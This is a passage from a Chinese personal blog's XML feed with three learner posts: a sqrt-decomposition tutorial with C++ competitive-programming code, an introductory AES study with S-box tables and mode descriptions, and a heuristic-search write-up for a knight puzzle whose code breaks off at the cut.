    <category term="分块" scheme="http://example.com/categories/icpc/algorithm/%E5%88%86%E5%9D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>分块入门</title>
    <link href="http://example.com/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/</id>
    <published>2021-12-21T18:00:00.000Z</published>
    <updated>2021-12-21T17:59:31.962Z</updated>
    
    <content type="html"><![CDATA[<p>最近cf刷的有点难，请教一位大神，大神曰，“汝之惑，分块也”，所以小菜鸡来学分块了。</p><span id="more"></span><h1 id="数列分块"><a href="#数列分块" class="headerlink" title="数列分块"></a>数列分块</h1><p>分块是我感觉是最优雅的暴力了，适用于同时区间修改和区间查询，而且书写十分方便。对于动态维护序列的题目我们一般会想到树状数组和线段树结构。</p><p>树状数组的限制十分明显，不能同时进行区间修改和区间查询地操作，只能支持单点修改+区间查询或者是区间修改和单点查询。虽然此题可以用树状数组做，但是主要还是练习一下分块。</p><p>线段树可以说是非常棒的动态维护序列的数据结构了，时间复杂度非常优秀，但是书写起来十分复杂。</p><p>分块也并不是万能的，如果同时区间修改和区间查询且数据范围在1e6的范围，那么分块就很可能超时了，此时只能使用线段树结构去维护这个序列。</p><p>各有优缺点吧，主要是分块的这个思想得学会，在很多地方都用得到。</p><p>下面给出分块算法中的一些特有名词</p><p>区间：数列中连续一段的元素</p><p>区间操作：将某个区间[a,b]的所有元素进行某种改动的操作</p><p>块：我们将数列划分成若干个不相交的区间，每个区间称为一个块</p><p><strong>整块</strong>：在一个区间操作时，完整包含于区间的块</p><p><strong>不完整的块</strong>：在一个区间操作时，只有部分包含于区间的块，即区间左右端点所在的两个块</p><h2 id="入门1"><a href="#入门1" class="headerlink" title="入门1"></a><a href="https://loj.ac/p/6277">入门1</a></h2><p>本道练习题在loj上，链接已经给出。</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>数据范围在5w，如果用朴素的算法那么必超时的。这个时候我们可以把整个序列分成一块一块的，那么到底怎么分呢，最优的分法应该是每一块包含(int)sqrt(n)个数据，最多能把数据分成(int)sqrt(n)+1块。那么在进行一次区间修改的时候，我们同样可以把区间按照分块的方式去操作，对于一个区间分出的每一个块，如果这个块有sqrt(n)个数据那么称这个块是完整的，否则是不完整的。对于完整的块，我们可以给一个标记数组，标记这个块整体都被加上了某个值；对于不完整的块我们可以对整个不完整的块内的数据进行单点修改。那么一次区间修改的操作复杂度就是sqrt(n)了。单点查询的时候只需要找到那个元素的值加上那个元素所在区间的标记就是该元素的实际值。</p><p>这里需要考虑以下几种情况：</p><p>左端点在块的起点，右端点不在另一个块的终点：需要先处理右端点所在的不完整的块的元素值之后，对剩下的完整的块进行区间标记。</p><p>左端点不在块的起点，右端点在另一个块的终点：需要先处理左端点所在的不完整的块的元素值之后，对剩下的完整的块进行区间标记。</p><p>左端点在块的起点，右端点在另一个块的终点：直接对所有块进行标记即可。</p><p>左端点与右端点在同一个块上，且完整占据整个块：直接对该块标记。</p><p>左端点与右端点在同一个块上，且不完整占据整个块：直接对区间内的元素进行修改即可。</p><p>刚开始考虑情况不周，导致WA了很多次，下面贴出AC代码和测评情况。</p><p>标程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span>  std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> block[<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    <span class="keyword">int</span> block_size=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c,i;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)/block_size==(r<span class="number">-1</span>)/block_size)&#123;</span><br><span class="line">                <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size==<span class="number">0</span>&amp;&amp;r%block_size==<span class="number">0</span>)&#123;</span><br><span class="line">                    block[(l<span class="number">-1</span>)/block_size+<span class="number">1</span>]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=r;i++)&#123;</span><br><span class="line">                        a[i]+=c;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(i=l;i&lt;=<span class="built_in">min</span>(((l<span class="number">-1</span>)/block_size+<span class="number">1</span>)*block_size,r);i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                l=i<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(r%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(i=<span class="built_in">max</span>((r<span class="number">-1</span>)/block_size*block_size+<span class="number">1</span>,l);i&lt;=r;i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                r=r/block_size*block_size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=l/block_size+<span class="number">1</span>;i&lt;=r/block_size;i++)&#123;</span><br><span class="line">                block[i]+=c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[r]+block[(r<span class="number">-1</span>)/block_size+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本蒟蒻测评的状况</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>这算正式入门了以下这个分块吧，后面把这个分块的所有入门都做了先。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近cf刷的有点难，请教一位大神，大神曰，“汝之惑，分块也”，所以小菜鸡来学分块了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
    <category term="分块" scheme="http://example.com/categories/icpc/algorithm/%E5%88%86%E5%9D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>AES加密学习</title>
    <link href="http://example.com/2021/12/18/AES%E5%8A%A0%E5%AF%86/"/>
    <id>http://example.com/2021/12/18/AES%E5%8A%A0%E5%AF%86/</id>
    <published>2021-12-18T02:00:00.000Z</published>
    <updated>2021-12-18T13:52:15.143Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学学AES。</p><span id="more"></span><h1 id="AES简介"><a href="#AES简介" class="headerlink" title="AES简介"></a>AES简介</h1><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图：</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/1.png" alt="1"></p><h2 id="分组问题"><a href="#分组问题" class="headerlink" title="分组问题"></a>分组问题</h2><p>AES属于分组加密，什么是分组加密呢，顾名思义，分组加密=分组+加密(狗头。分组就是说把它分成一个个组进行加密，可以把它和base64作为一个对比，base64是三个字符一组进行编码，那么既然是要分组那必然也会遇到分组不满的情况，这个时候需要加上填充。这个填充呢，有很多种方案。</p><h3 id="零字节填充"><a href="#零字节填充" class="headerlink" title="零字节填充"></a>零字节填充</h3><p>这个可以说是比较常见的手段了，一般人一般也都能想得到，但是这样的话难以区分末尾的0到底是它的信息本来就存在的还是填充的，信息表达不明确。</p><h3 id="填充n位n"><a href="#填充n位n" class="headerlink" title="填充n位n"></a>填充n位n</h3><p>这个略有点意思。但是假如它本来信息就有n位n呢？那么最后的那n位n还是没办法区分是不是它本来就有的。</p><p>那么最终AES采取了哪种填充方式呢？它选择在第二种方案中改进，如果长度刚好不需要填充，那么就填充16位16。这么一来，如果它末尾存在了n位n，但是由于长度满足16的倍数，那么还会填充16位16，这样它就能够区分填充位和明文位了。</p><h2 id="AES常见分类"><a href="#AES常见分类" class="headerlink" title="AES常见分类"></a>AES常见分类</h2><p>AES有三种常见加密标准，根据密钥位数不同用于区分，密钥的长度不同，推荐加密轮数也不同，如下表所示：</p><table><thead><tr><th>AES</th><th>密钥长度（字节)</th><th>分组长度(字节)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>16</td><td>16</td><td>10</td></tr><tr><td>AES-192</td><td>24</td><td>16</td><td>12</td></tr><tr><td>AES-256</td><td>32</td><td>16</td><td>14</td></tr></tbody></table><p>AES还有五种加密模式：1.电码本模式（Electronic Codebook Book (ECB)）；2.密码分组链接模式（Cipher Block Chaining (CBC)）；3.计算器模式（Counter (CTR)）；4.密码反馈模式（Cipher FeedBack (CFB)）；5.输出反馈模式（Output FeedBack (OFB)）。</p><p>本片博客只介绍前两种模式。</p><h1 id="AES加密流程"><a href="#AES加密流程" class="headerlink" title="AES加密流程"></a>AES加密流程</h1><p>AES的EBC模式大概可以用下面的流程图图表示</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/2.png" alt="2"></p><h2 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h2><p>官方的解释是，建立16*16的字节表，然后把自己拆成高4位和低四位，高四位位行，第四位为列好去查表替换。这个很好理解，其实就是在0x00-0xff字节内建立双射，让每个字节替换为其它字节。比如最简单的，我让所有字节都加1%256，也是一个双射变换。那么既然是一个双射，那么我们很容易求出它的逆。</p><p>一般AES加密用以下的字节替换表</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>那么它的逆表就是</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><p>比如在第一个表中可以看到0行0列是0x63，与之对应的，在第二张表的第6行第三列就是0x00，也就是0x63在第一个表中的位置。因为AES是对称加密，所以每一步操作都需要可逆。</p><h2 id="行位移"><a href="#行位移" class="headerlink" title="行位移"></a>行位移</h2><p>这里要说一下，AES分组是16个字节一组，在加密的过程中16字节会形成4x4的矩阵，字节按照以下顺序排列</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/3.png" alt="3"></p><p>行移位是一个简单的左循环移位操作。第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/4.png" alt="4"></p><p>逆变换当然也很简单，就不细讲了。</p><h2 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h2><p>这个涉及到的知识比较多，我有点难以接受，mark一下，以后再补</p><p>就是说把它当成一个矩阵然后和另一个矩阵做乘法运算得到新的矩阵，至于逆过程就是对逆矩阵做乘法。然后这里面的加法就是异或，乘法会变成取模乘法。(应该是这样的)</p><h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><p>这个很简单，就是扩展密钥，密钥输入了16字节，每组四个字节就是四组，第一组和第四组异或得到第五组，第二组和第五组异或得到第六组，第三组和第六组异或得到第七组，以此类推。因为要加密10次，所以扩展出四十组密钥。</p><p>然后就是很简单的了，列混淆得到的矩阵再和密钥异或一下即可。每次都和不一样的密钥做异或，一共十次，这就是AES。</p><h1 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h1><p>分组加密有一个缺点，分组之间独立，一样的数据不管在第几组都是一样的加密，如果我已只很多密文明文对，那么加密的信息很可能会被暴力破解出来，CBC就是用来对抗这个缺点的。CBC不通的就是，会有一个初始向量与第一组的数据进行异或，然后第二组的会和第一组异或加密前的数据异或再进行加密，以此类推，这样的话，分组之间将不再独立，改动前面的一个字节很可能导致整个密文发生巨大变化。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天来学学AES。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>启发式搜索算法进阶</title>
    <link href="http://example.com/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/"/>
    <id>http://example.com/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/</id>
    <published>2021-12-16T14:00:00.000Z</published>
    <updated>2021-12-16T18:26:20.630Z</updated>
    
    <content type="html"><![CDATA[<p>继续来学启发式搜索</p><span id="more"></span><p>多的其实没啥好讲了的，因为概念问题在前一篇博文已经讲的很清楚了。主要就是训练寻找估值函数，多点题目练习能应对不通场景下的启发式搜索。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>洛谷上的<a href="https://www.luogu.com.cn/problem/P2324">p2324骑士精神</a></p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://cdn.luogu.com.cn/upload/pic/1389.png" alt="1"></p><p>主要就是说有个空格，然后所有马都走日，没有马脚，只能跳到空格里面去，然后问你是否能在15步以内达到。如果可以则输出最短步数，否则输出-1，因为空格只有一个我们不考虑跳马，考虑跳空格。</p><p>递归最大深度15层能确定了，但是任意一个状态可以延伸出最少2中最多八种情况。15作为指数时间上还是遭不住，考虑启发式搜索。那么估值函数需要怎么写呢？</p><h3 id="估值函数"><a href="#估值函数" class="headerlink" title="估值函数"></a>估值函数</h3><p>这里再补充点估值函数的知识。</p><p><em>f</em>(<em>n</em>)=<em>g</em>(<em>n</em>)+<em>h</em>(<em>n</em>)</p><p>估值函数一般表达式如上，g(n)为当前状态，h(n)为未来最优状态产生的花费，或者是其它。估值函数为两者和，由于当前状态我们很容易获取，所以算出未来最优状态即可等于获得了估值函数。可能前面讲的有点小问题，但是还是不妨碍的，因为我们平时写也基本是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">f</span>(n)+value&gt;ans)&#123;</span><br><span class="line"><span class="built_in">dfs</span>(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以问题不大。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>在本题中，我们的估值函数应该是算能到达目的状态的最小步数。那么这个怎么去考虑呢，其实可以拿当前状态与目标状态相比较，如果有两个点不符合目标状态，那么它们最优能达成目标状态一定是1，这里的最优指的是所有的这个情况下能达成目的状态的最小值。因为如果两个不符合的点不形成“日”字的关系，那么它们可能就不止需要1步了，但是估值并不是真的去计算真正的实际情况，估值函数需要尽可能的方便计算，这点很重要。</p><p>那么如果我们有三个点不一样那情况如何呢？那考虑最好的情况那还得是2步解决。所以我们很容易可以发现，假如当前状态与目标状态有n个点不一样，那么它最少需要n-1步来完成。</p><p>所以我们很容易可以写出估值函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当估值函数返回-1的时候说明当前已经符合目标状态了，那么这个将作为搜索终止条件，并更新最优解。</p><p>剩下的就是终归中距的dfs了。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 